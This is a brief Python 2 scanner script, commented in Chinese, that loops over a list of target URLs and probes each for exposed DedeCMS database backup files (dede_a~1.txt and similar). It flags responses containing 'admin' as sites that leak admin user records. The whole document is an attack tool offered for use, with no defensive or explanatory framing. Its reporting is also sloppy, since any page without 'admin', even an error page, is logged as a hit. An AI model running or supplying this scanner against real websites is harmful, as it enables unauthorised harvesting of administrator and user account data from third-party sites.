#!/usr/bin/python
# -*- coding: UTF-8 -*-
import requests

urls = open(r'url.txt', 'r')
# 定义扫描的payload
payloads = ['/data/backupdata/dede_a~',
            '/data/backupdata/dede_h~',
            '/data/backupdata/dede_m~',
            '/data/backupdata/dede_p~',
            '/data/backupdata/dede_s~']
for url in urls:
    for payload in payloads:
        for number in range(1, 5):
            testurl = url.strip() + payload + str(number) + ".txt"
            print(testurl)
            html = requests.get(testurl).text
            if "admin" in html:
                print "admin用户存在的url：" + testurl
            else:
                print "其他用户存在的url：" + testurl
